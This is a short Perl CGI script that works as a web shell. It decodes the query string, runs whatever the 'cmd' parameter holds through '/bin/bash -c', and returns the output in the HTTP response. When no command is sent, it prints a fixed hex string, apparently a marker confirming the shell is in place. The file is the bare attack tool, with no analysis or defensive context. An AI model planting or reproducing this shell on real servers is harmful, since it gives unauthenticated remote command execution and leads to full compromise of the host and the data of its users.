#!/usr/bin/perl

if (length ($ENV{'QUERY_STRING'}) > 0){
    $buffer = $ENV{'QUERY_STRING'};
    @pairs = split(/&/, $buffer);
    foreach $pair (@pairs){
        ($name, $value) = split(/=/, $pair);
        $value =~ s/\+/%20/g;
        $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
        $in{$name} = $value; 
    }
}

print "Content-type: text/html\n\n";

if($in{'cmd'} ne "") {
    print `/bin/bash -c "$in{'cmd'}"`;
}
else
{
    print "15825b40c6dace2a" . "7cf5d4ab8ed434d5";
}
